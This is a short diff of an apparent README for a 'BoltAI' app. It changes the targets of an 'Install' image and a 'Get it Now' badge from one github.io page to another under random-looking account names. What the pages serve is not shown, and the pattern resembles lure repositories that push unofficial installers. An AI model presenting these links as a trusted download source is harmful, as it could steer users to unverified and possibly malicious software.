@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://pasito2-pod.github.io/.github/boltAI)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://loksi-wias.github.io/.github/boltAI)
 
 </div>
 
@@ -81,7 +81,7 @@ BoltAI's quick-access panel model addresses the friction cost of browser-based A
 
 <p align="center">
 
-[![Get it Now BoltAI](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://pasito2-pod.github.io/.github/boltAI)
+[![Get it Now BoltAI](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://loksi-wias.github.io/.github/boltAI)
 
 </p>
 
